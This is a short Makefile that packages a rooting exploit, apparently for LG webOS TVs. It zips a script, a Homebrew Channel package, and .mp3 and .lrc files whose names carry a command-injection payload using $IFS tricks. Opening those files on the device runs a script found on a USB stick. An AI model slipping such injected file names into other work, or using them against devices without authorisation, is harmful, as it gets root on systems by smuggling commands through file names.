ZIPOUT = dejavuln-autoroot.zip

HAXBASE = lol$$(sh$$IFS$$(find$$IFS/tmp/usb$$IFS-maxdepth$${IFS}3$$IFS-name$${IFS}autoroot.sh))

FILES = autoroot.sh hbchannel-0.6.3.ipk $(HAXBASE).mp3 $(HAXBASE).lrc

.PHONY: all
all: $(ZIPOUT)

$(ZIPOUT): $(FILES)
	zip -X '$(@)' -- $(foreach f,$^,'$(f)')

.PHONY: clean
clean:
	rm -f -- '$(ZIPOUT)'
